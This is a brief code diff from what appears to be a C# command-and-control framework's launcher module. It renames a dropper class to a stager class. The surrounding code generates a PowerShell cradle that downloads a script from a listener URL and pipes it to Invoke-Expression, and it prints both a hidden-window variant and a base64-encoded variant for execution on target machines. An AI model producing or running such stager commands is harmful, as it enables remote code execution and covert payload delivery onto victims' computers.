@@ -107,7 +107,7 @@ namespace Commander.Commands.Laucher
 
                 string caller = $"(New-Object Net.WebClient).DownloadString('{url}') | iex";
                 if (listener.Secured)
-                    caller = BuildDropperCommand.PowershellSSlScript + caller;
+                    caller = BuildStagerCommand.PowershellSSlScript + caller;
                 context.Terminal.WriteLine($"[>] Command : powershell -noP -sta -w 1 -c \"{caller}\"");
                 string caller64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(caller));
                 context.Terminal.WriteLine($"[>] Command : powershell -noP -sta -w 1 -enc {caller64}");
